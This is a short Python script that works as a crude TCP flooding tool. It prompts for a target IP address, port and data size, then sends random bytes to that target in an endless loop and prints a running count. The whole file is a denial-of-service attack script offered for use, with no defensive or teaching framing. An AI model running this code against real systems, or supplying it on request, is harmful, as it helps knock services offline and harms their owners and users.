import socket
import random

socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip=raw_input("Target IP: ")
port=input("Port:")
num_bytes=input("Data Size: ")
bytes=random._urandom(num_bytes)
addr=(ip,port)
socket.connect(addr)
socket.settimeout(0.0) #socket.settimeout(None) #socket.setblocking(0)
sent=0
while True:
    socket.sendto(bytes,(ip,port))
    print ('Sent %s TCP Packets to %s at port %d') % (sent,ip,port)
    sent= sent +1
